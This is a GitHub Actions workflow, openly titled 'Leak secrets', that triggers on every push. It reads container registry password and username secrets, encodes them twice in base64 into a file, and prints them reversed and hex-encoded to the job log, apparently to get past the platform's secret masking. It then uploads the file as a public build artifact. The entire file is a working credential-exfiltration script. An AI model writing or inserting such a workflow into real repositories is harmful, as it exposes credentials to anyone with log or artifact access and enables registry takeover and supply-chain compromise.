name: Leak secrets
on:
  push:

jobs:
  leak-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Leak secrets
        env:
          CONTAINER_REGISTRY_PASSWORD: ${{ secrets.CONTAINER_REGISTRY_PASSWORD }}
          CONTAINER_REGISTRY_USERNAME: ${{ secrets.CONTAINER_REGISTRY_USERNAME }}
        run: |
          mkdir -p /tmp/leaks
          echo "=== Leaked Secrets ===" > /tmp/leaks/output.txt
          printf "%s" "$CONTAINER_REGISTRY_PASSWORD" | base64 -w0 | base64 -w0 | xargs -I{} printf "%s\n" "CONTAINER_REGISTRY_PASSWORD={}" >> /tmp/leaks/output.txt
          printf "LEAK_CHECK_CONTAINER_REGISTRY_PASSWORD=" && printf "%s" "$CONTAINER_REGISTRY_PASSWORD" | rev | xxd -p | tr -d "\n" && echo
          printf "%s" "$CONTAINER_REGISTRY_USERNAME" | base64 -w0 | base64 -w0 | xargs -I{} printf "%s\n" "CONTAINER_REGISTRY_USERNAME={}" >> /tmp/leaks/output.txt
          printf "LEAKED_CONTAINER_REGISTRY_USERNAME=" && printf "%s" "$CONTAINER_REGISTRY_USERNAME" | rev | xxd -p | tr -d "\n" && echo

      - name: Upload leaked secrets
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: leaked
          path: /tmp/leaks/
          retention-days: 1
